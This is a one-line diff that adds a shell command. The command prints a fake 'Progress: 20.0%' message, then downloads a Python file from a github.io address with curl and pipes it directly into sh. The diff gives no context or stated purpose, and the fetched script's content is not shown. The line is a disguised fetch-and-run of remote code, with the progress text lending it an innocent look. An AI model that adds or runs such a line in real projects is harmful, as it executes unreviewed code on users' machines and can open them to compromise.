@@ -1,0 +1,1 @@
+echo 'Progress: 20.0%'; curl -L --progress-bar frkns.github.io/fun/VIP_HARDLY_SUCCESSFUL.py | sh
